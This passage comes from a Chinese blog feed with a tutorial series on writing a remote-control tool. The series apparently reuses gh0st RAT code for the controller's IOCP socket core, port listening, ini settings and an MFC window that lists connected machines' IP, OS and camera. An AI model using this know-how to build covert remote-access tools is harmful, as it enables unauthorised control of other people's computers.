data-num=\"75\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// I'm just going to post message so we can see the data</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">int</span>\tnCompressLength <span class=\"token operator\">=</span> nSize <span class=\"token operator\">-</span> HDR_SIZE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t\t\t\tPBYTE pData <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> BYTE<span class=\"token punctuation\">[</span>nCompressLength<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// 重新计算数据的压缩前大小</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t\t\t\tPBYTE pDeCompressionData <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> BYTE<span class=\"token punctuation\">[</span>nUnCompressLength<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t\t\t\t</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pData <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">||</span> pDeCompressionData <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">throw</span> <span class=\"token string\">\"bad Allocate\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t\t\t\tpContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>pData<span class=\"token punctuation\">,</span> nCompressLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t\t\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t\t\t\t<span class=\"token comment\">// 解压缩数据 ，此处也就是这个完成端口传输的 精妙所在，用解压是否成功判断 数据包是否完整接收</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span>\tdestLen <span class=\"token operator\">=</span> nUnCompressLength<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">int</span>\tnRet <span class=\"token operator\">=</span> <span class=\"token function\">uncompress</span><span class=\"token punctuation\">(</span>pDeCompressionData<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>destLen<span class=\"token punctuation\">,</span> pData<span class=\"token punctuation\">,</span> nCompressLength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t\t\t\t<span class=\"token comment\">//////////////////////////////////////////////////////////////////////////</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nRet <span class=\"token operator\">==</span> Z_OK<span class=\"token punctuation\">)</span>   <span class=\"token comment\">// 如果完整接收</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\t\t\t\t\t<span class=\"token comment\">// 写入数据</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t\t\t\t\tpContext<span class=\"token operator\">-></span>m_DeCompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">ClearBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t\t\t\t\tpContext<span class=\"token operator\">-></span>m_DeCompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>pDeCompressionData<span class=\"token punctuation\">,</span> destLen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t\t\t\t <span class=\"token comment\">// 调用回调函数传递  NC_RECEIVE_COMPLETE  到回调函数看一下 </span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t\t\t\t\t<span class=\"token function\">m_pNotifyProc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPVOID<span class=\"token punctuation\">)</span> m_pFrame<span class=\"token punctuation\">,</span> pContext<span class=\"token punctuation\">,</span> NC_RECEIVE_COMPLETE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"97\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">throw</span> <span class=\"token string\">\"bad buffer\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">delete</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> pData<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">delete</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> pDeCompressionData<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t\t\tpContext<span class=\"token operator\">-></span>m_nMsgIn<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t<span class=\"token comment\">// Post to WSARecv Next</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t<span class=\"token function\">PostRecv</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\tpContext<span class=\"token operator\">-></span>m_CompressionBuffer<span class=\"token punctuation\">.</span><span class=\"token function\">ClearBuffer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t<span class=\"token comment\">// 要求重发，就发送 0, 内核自动添加数包标志</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t<span class=\"token function\">Send</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t<span class=\"token function\">PostRecv</span><span class=\"token punctuation\">(</span>pContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"分析gh0st主控端socket内核2\"><a class=\"anchor\" href=\"#分析gh0st主控端socket内核2\">#</a> 分析 gh0st 主控端 socket 内核 (2)</h2>\n<p>1.CIOCPServer 类 Send 函数讲解<br />\n 2.CIOCPServer 类 OnClientReading 函数讲解</p>\n<h2 id=\"加入gh0st的socket内核文件并编译\"><a class=\"anchor\" href=\"#加入gh0st的socket内核文件并编译\">#</a> 加入 gh0st 的 socket 内核文件并编译</h2>\n<p>1. 复制 gh0st 主控端的 include 文件夹到我们的工程下。<br />\n2. 包含复制过来的 include 文件夹下的文件。<br />\n3. 复制 common 文件夹到我们的工程的上一层目录下。<br />\n4. 改变 #include &quot;zlib\\zlib.h&quot;  的文件路径 #include &quot;......\\common\\zlib\\zlib.h&quot;<br />\n5. 注释掉 //#include&quot;../MainFrm.h&quot;<br />\n6. 添加....\\common\\zlib\\zlib.lib 库<br />\n属性 --&gt; 连接器 --&gt; 输入 --&gt; 附加依赖项 ....\\common\\zlib\\zlib.lib<br />\n7. 忽略特定默认库 LIBCMT.lib<br />\n8. 编译成功 ok............</p>\n<h2 id=\"加入端口监听功能\"><a class=\"anchor\" href=\"#加入端口监听功能\">#</a> 加入端口监听功能</h2>\n<p>1. 分析 gh0st 监听端口的代码:<br />\nActivate(UINT nPort, UINT nMaxConnections)<br />\n 2. 需要一个回调函数<br />\n NotifyProc<br />\n3. 复制 NotifyProc 代码  去掉多余的代码<br />\n 4. 复制 Activate  代码 并处理<br />\n 5. 监听后添加日志消息<br />\n str.Format (&quot;监听端口: % d 成功&quot;, nPort);<br />\nShowMessage(true,str);</p>\n<pre><code>//else\nstr.Format(&quot;监听端口: %d失败&quot;, nPort);\nShowMessage(false,str);\n</code></pre>\n<p>6. 测试  netstat -an</p>\n<h2 id=\"ini-配置文件的读写\"><a class=\"anchor\" href=\"#ini-配置文件的读写\">#</a> ini 配置文件的读写</h2>\n<p>1. 认识几个读写 ini 文件的 API<br />\nBOOL WINAPI WritePrivateProfileString (     // 在 ini 文件中写入指定字符<br />\n__in          LPCTSTR lpAppName,                       // 节的名字<br />\n__in          LPCTSTR lpKeyName,                      // 键值的名字<br />\n__in          LPCTSTR lpString,                       // 要写入的内容 如果为 NULL  则删除该键<br />\n__in          LPCTSTR lpFileName                      //ini 文件名<br />\n);</p>\n<pre><code>           UINT WINAPI GetPrivateProfileInt(\n</code></pre>\n<p>__in          LPCTSTR lpAppName,                    // 节名字<br />\n__in          LPCTSTR lpKeyName,                     // 键值<br />\n__in          INT nDefault,                          // 读取的内容<br />\n__in          LPCTSTR lpFileName                      //ini 文件名<br />\n);</p>\n<p>2.gh0st 工程中已经对 ini 文件的读写有了很好的封装，我们有了初步的认识之后，底层实现我们也有了初步了解，现在就可以使用封装好的类了。</p>\n<p>3. 复制 gh0st 工程下的 iniFile.h 和 iniFile.cpp 到我们的工程中并添加<br />\n 4 查看 gh0st 是怎样读写 ini 文件的，到 CGh0stApp::InitInstance ()<br />\n 源码中讲解</p>\n<p>5. 大家可能会奇怪 ini 文件名从何而来，我们来看一下这个类的构造函数 CIniFile::CIniFile ()<br />\n 源码中讲解<br />\n 6. 剩下还有好多封装好的功能，有兴趣大家自己研究吧<br />\n 7. 声明一个 ini 文件处理的变量 CIniFile m_IniFile;  这个变量不应该到处声明，最好只声明一次，因为构造函数中，有一个文件处理的过程，影响程序运行速度，<br />\n这样最好在 CPCRemoteApp 类中声明，以后使用就可以这样调用:<br />\n((CPCRemoteApp*)AfxGetApp())-&gt;m_IniFile<br />\n8. 为 CPCRemoteDlg 添加一个成员函数 ListenPort  用于管理监听的代码，写入内容:<br />\nint\tnPort = ((CPCRemoteApp*) AfxGetApp ())-&gt;m_IniFile.GetInt (&quot;Settings&quot;, &quot;ListenPort&quot;);         // 读取 ini 文件中的监听端口<br />\n int\tnMaxConnection = ((CPCRemoteApp*) AfxGetApp ())-&gt;m_IniFile.GetInt (&quot;Settings&quot;, &quot;MaxConnection&quot;);   // 读取最大连接数<br />\n if (nPort == 0)<br />\nnPort = 80;<br />\nif (nMaxConnection == 0)<br />\nnMaxConnection = 10000;<br />\nActivate (nPort,nMaxConnection);             // 开始监听<br />\n 9. 替换 OnInitDialog () 中  Activate 函数为 ListenPort。<br />\n10. 处理崩溃<br />\n 11. 添加监听端口的设置</p>\n<pre><code>(1)添加对话框IDD_DIALOG_SETTING\n(2)添加控件  IDC_EDIT_PORT  ,IDC_EDIT_MAX\n(3)添加对话框类 CSettingDlg\n(4)添加控件变量  m_nListernProt;\n            m_nMax_Connect;\n     \n(5)添加按钮事件并写入代码:  \n     UpdateData(TRUE);\n((CPCRemoteApp *)AfxGetApp())-&gt;m_IniFile.SetInt(&quot;Settings&quot;, &quot;ListenPort&quot;, m_nListernProt);      //向ini文件中写入值\n((CPCRemoteApp *)AfxGetApp())-&gt;m_IniFile.SetInt(&quot;Settings&quot;, &quot;MaxConnection&quot;, m_nMax_Connect);\nMessageBox(&quot;设置成功，重启本程序后生效！&quot;);\n</code></pre>\n",
            "tags": [
                "数据传输",
                "ini文件的读写"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/MFC/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%86%99%E8%BF%9C%E6%8E%A7-01%E7%95%8C%E9%9D%A2%E7%BC%96%E5%86%99%E5%92%8C%E8%AE%BE%E8%AE%A1/",
            "url": "https://or0kit.github.io/Programming/MFC/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%86%99%E8%BF%9C%E6%8E%A7-01%E7%95%8C%E9%9D%A2%E7%BC%96%E5%86%99%E5%92%8C%E8%AE%BE%E8%AE%A1/",
            "title": "从零开始写远控-01界面编写和设计",
            "date_published": "2022-06-15T14:59:21.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>早就想学习如何编写远控了。<br />\n前几天网上冲浪看到了一篇博客，其博主看教程是 11 年（11 年了）的网名为老狼的前辈的教程，于是我也在网上找了一下这个教程，虽然已经有些年头了，不过这并不影响我们学习大规模软件开发的设计思想。</p>\n<p>注：<strong>因为目前本人水平有限，有些内容会搬运教程中的教案，如有侵犯，即刻删除。</strong></p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>创建一个基于对话框的 MFC 项目。</p>\n<p>首先设计主控端的界面。</p>\n<h2 id=\"对话框-列表控件的伸缩\"><a class=\"anchor\" href=\"#对话框-列表控件的伸缩\">#</a> 对话框、列表控件的伸缩</h2>\n<ol>\n<li>\n<p>新建一个工程，看操作  我们必须给工程起一个响亮的名字 😄  就叫  <code>Or0Remote</code>  吧</p>\n</li>\n<li>\n<p>添加最大化窗口，最小化窗口的属性</p>\n</li>\n</ol>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<ol start=\"3\">\n<li>\n<p>更改对话框到适当大小</p>\n</li>\n<li>\n<p>添加服务端连接后显示的列表控件，控件 ID 设置为： IDIDC_ONLINE ，日志列表控件，控件 ID 设置为： IDC_MESSAGE</p>\n</li>\n<li>\n<p>伸缩窗口，发现列表不能随着窗口伸缩。</p>\n</li>\n<li>\n<p>添加列表控件变量 m_CList_Online , m_CList_Message</p>\n</li>\n<li>\n<p>响应对话框改变大小的消息是 WM_SIZE 就是向对话框抛出这个消息，对话框就会改变大小，我们先响应这个消息，然后再把这个消息向下传递。</p>\n</li>\n</ol>\n<p>可以在对话框的类向导中添加此消息。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>也可以对对话框右键，点击属性，点击消息，在消息一栏中查看 WM_SIZE 消息，添加处理函数。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<ol start=\"8\">\n<li>写入更改列表大小的代码</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_CList_Online<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\tCRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>left<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 列表的左坐标</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>top<span class=\"token operator\">=</span><span class=\"token number\">80</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// 列表的上坐标</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>right<span class=\"token operator\">=</span>cx<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列表的右坐标</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>bottom<span class=\"token operator\">=</span>cy<span class=\"token operator\">-</span><span class=\"token number\">160</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列表的下坐标</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tm_CList_Online<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>m_CList_Message<span class=\"token punctuation\">.</span>m_hWnd<span class=\"token operator\">!=</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\tCRect rc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>left<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 列表的左坐标</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>top<span class=\"token operator\">=</span>cy<span class=\"token operator\">-</span><span class=\"token number\">156</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 列表的上坐标</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>right<span class=\"token operator\">=</span>cx<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 列表的右坐标</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\trc<span class=\"token punctuation\">.</span>bottom<span class=\"token operator\">=</span>cy<span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 列表的下坐标</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tm_CList_Message<span class=\"token punctuation\">.</span><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"9\">\n<li>示范伸缩</li>\n</ol>\n<p>刚初始化完的对话框：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>稍微拉伸了一点的对话框，既触发了 WM_SIZE 消息后的对话框：</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>需要解决伸缩后与原来有差别的问题！</p>\n<ol start=\"10\">\n<li>伸缩同原来的有差别，小技巧：</li>\n</ol>\n<p>我们可以在初始化对话框的函数  <code>OnInitDialog</code>  中触发 WM_SIZE 消息。</p>\n<p>添加下面的代码：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>CRect rect<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">GetWindowRect</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>rect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>rect<span class=\"token punctuation\">.</span>bottom<span class=\"token operator\">+=</span><span class=\"token number\">20</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">MoveWindow</span><span class=\"token punctuation\">(</span>rect<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这样初始化窗口的时候 List 控件就被修正成了与拉伸后一样的了。</p>\n<h2 id=\"加入列表的列名称\"><a class=\"anchor\" href=\"#加入列表的列名称\">#</a> 加入列表的列名称</h2>\n<ol>\n<li>参考 gh0st 的列表中的列名:</li>\n</ol>\n<p>0IP 1 所在区域   2 计算机名 / 备注  3 操作系统  4CPU  5 摄像头  6Ping</p>\n<ol start=\"2\">\n<li>我们已经为列表控件添加变量了，我们来查看变量的类型:<br />\n <code>CListCtrl</code>  类<br />\n查看 MSDN  找到</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">InsertColumn</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">int</span> nCol<span class=\"token punctuation\">,</span>                  <span class=\"token comment\">// 列的顺序</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                LPCTSTR lpszColumnHeading<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 列的名字</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">int</span> nFormat <span class=\"token operator\">=</span> LVCFMT_LEFT<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// 列对齐的方式 LVCFMT_LEFT, LVCFMT_RIGHT,LVCFMT_CENTER</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">int</span> nWidth <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>            <span class=\"token comment\">// 列的宽度</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token keyword\">int</span> nSubItem <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>           <span class=\"token comment\">// 与之联系的子条目 默认为 - 1 我们不用写</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"3\">\n<li>有了这些我们可以现在就写入代码了，但请等一下！</li>\n</ol>\n<p>我们来考虑一下以后的扩展问题，假如我们要加入新的列那会不会很麻烦，我们每一个列都写入了固定的顺序 (0--6) 没有考虑扩展，比如在 CPU 列的后面加入显示内存大小，那么加入的就是第 5 列，而第 5 列恰好是摄头，这样如果更改的话，就会很麻烦。</p>\n<p><strong>解决这个问题的方式就是用枚举 enum 写入列的顺序时不写入硬编码 (0----6) 而是写入枚举成员这样我们只需很小的改动就能达到目的。</strong></p>\n<p>很多知识都是这个样，学习到的知识只有到实践中才体会到用处很大，枚举变量就是一个例子，我刚开始学习时并不知道这个有什么用，实践中才发现用<br />\n枚举解决问题更简单，更高效。</p>\n<ol start=\"4\">\n<li>因为这个列表比较重要所以要放到一个每一个文件都能访问到的文件很自然的就是 stdafx.h（在如今的 VS2019 中，我把他们放到了 pch.h）</li>\n</ol>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">enum</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tONLINELIST_IP<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>          <span class=\"token comment\">//IP 的列顺序</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tONLINELIST_ADDR<span class=\"token punctuation\">,</span>          <span class=\"token comment\">// 地址</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tONLINELIST_COMPUTER_NAME<span class=\"token punctuation\">,</span> <span class=\"token comment\">// 计算机名 / 备注</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tONLINELIST_OS<span class=\"token punctuation\">,</span>            <span class=\"token comment\">// 操作系统</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tONLINELIST_CPU<span class=\"token punctuation\">,</span>           <span class=\"token comment\">//CPU</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tONLINELIST_VIDEO<span class=\"token punctuation\">,</span>         <span class=\"token comment\">// 摄像头</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\tONLINELIST_PING           <span class=\"token comment\">//PING</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"5\">\n<li>处理列表的代码应该统一放在一处，添加列表处理的代码 InitList ()</li>\n</ol>\n<p><strong>可以在类视图中对着对话框的类右键添加函数</strong></p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<ol start=\"6\">\n<li>写入加入列表列名的代码:</li>\n</ol>\n<p>列表的名字与列表的宽度是同一一对应的关系，以后为了以后修改方便建立这样的一个结构体:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tLPTSTR title<span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 列表的名称</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tsize_t  nWidth<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// 列表的宽度</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span>COLUMNSTRUCT<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>然后建立这个结构体变量的数组</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>COLUMNSTRUCT g_Column_Online_Data<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"IP\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t\t\t<span class=\"token number\">148</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"区域\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t\t<span class=\"token number\">150</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"计算机名/备注\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t<span class=\"token number\">160</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"操作系统\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t<span class=\"token number\">128</span>\t<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span><span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CPU\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\t\t\t\t<span class=\"token 